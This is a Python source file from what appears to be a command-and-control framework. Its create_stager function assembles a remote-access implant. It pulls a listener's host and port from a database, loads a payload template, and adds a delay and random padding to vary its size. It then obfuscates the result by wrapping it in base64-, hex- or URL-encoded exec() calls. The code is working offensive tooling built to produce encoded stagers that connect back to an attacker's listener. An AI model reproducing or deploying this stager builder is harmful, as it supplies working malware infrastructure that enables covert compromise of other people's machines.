from binascii import hexlify
import urllib.parse
from Utils import *


def create_stager(listener: str, encoder: str = "base64", random_size : bool = False, timeout : int = 5000, exisiting_stager: str = None, name : str = None, format : str = "py", delay : int = 1) -> str:
    """
    Create a Stager
    :param listener: The Listener to use
    :param encoder: The Encoder to use
    :param random_size: Randomize the size of the payload
    :param timeout: How often the Stager should try to connect before exiting
    :param exisiting_stager: The Exisiting Stager to use
    :param name: The Name of the Stager
    :param format: The Format to use
    :param delay: How long to wait before starting the Stager
    :return: The Stager as a string
    """
    if exisiting_stager is not None:
        # Check if Stager exists
        curr.execute(f"SELECT * FROM Stagers WHERE Name = ?", (exisiting_stager,))
        stager = curr.fetchone()
        if not stager:
            raise Exception(f"Stager {exisiting_stager} does not exist")
        # Get Data
        id = stager[0]
        name = stager[1]
        listener_id = stager[2]
        encoder = stager[3]
        # Get Type
        curr.execute(f"SELECT * FROM Listeners WHERE ID = ?", (listener_id,))
        listener = curr.fetchone()
        type = listener[2]
        config = json.loads(listener[3])
        # Get Config Data
        address = config["address"]
        port = config["port"]
    else:
        # Check if Listener exists
        curr.execute("SELECT * FROM Listeners WHERE Name = ?", (listener,))
        listener = curr.fetchone()
        if not listener:
            raise Exception("Could not find the listener")
        # Get Data 
        listener_id = listener[0]
        listener_name = listener[1]
        type = listener[2]
        config = json.loads(listener[3])
        # Get Config Data
        address = config["address"]
        port = config["port"]
    # Check if Name is already in use
    if exisiting_stager is None:
        curr.execute("SELECT * FROM Stagers WHERE Name = ?", (name,))
        stager = curr.fetchone()
        if stager:
            raise Exception(f"Stager {name} already exists")
    # Get the Listener from the File
    try:
        with open("Payloads/" + type + ".py", "r") as f:
            payload = f.read()
    except:
        raise Exception("Could not find the payload")
    # Randomize the Payload
    if random_size:
        start = "".join(random.choices(string.ascii_letters, k=random.randint(5, 10))) + " = " + \
            "'" + "".join(random.choices(string.ascii_letters +
                          string.digits, k=random.randint(100, 500))) + "'"
        end = "".join(random.choices(string.ascii_letters, k=random.randint(5, 10))) + " = " + \
            "'" + "".join(random.choices(string.ascii_letters +
                          string.digits, k=random.randint(100, 500))) + "'"
    else:
        start = ""
        end = ""
    finished_payload = "#!/usr/bin/env python3" "\n"
    finished_payload +=  start + "\n"
    finished_payload += f"import time\ntime.sleep({delay})\nHOST = '{address}'\nPORT = {port}\nTIMEOUT = {timeout}\n"
    finished_payload += payload + "\n" + end
    if encoder == "base64":
        finished_payload = """import base64;exec(base64.b64decode(b'%s'))""" % base64.b64encode(
            finished_payload.encode()).decode()
    elif encoder == "hex":
        finished_payload = """from binascii import unhexlify;exec(unhexlify('%s'))""" % hexlify(
            finished_payload.encode()).decode()
    elif encoder == "url":
        finished_payload = """import urllib.parse;exec(urllib.parse.unquote('%s'))""" % urllib.parse.quote(
            finished_payload)
    # Save the Stager to the Database
    if not exisiting_stager:
        curr.execute("INSERT INTO Stagers (Name, ListenerId, Encoder) VALUES (?, ?, ?)", (name, listener_id, encoder))
        conn.commit()
    return finished_payload
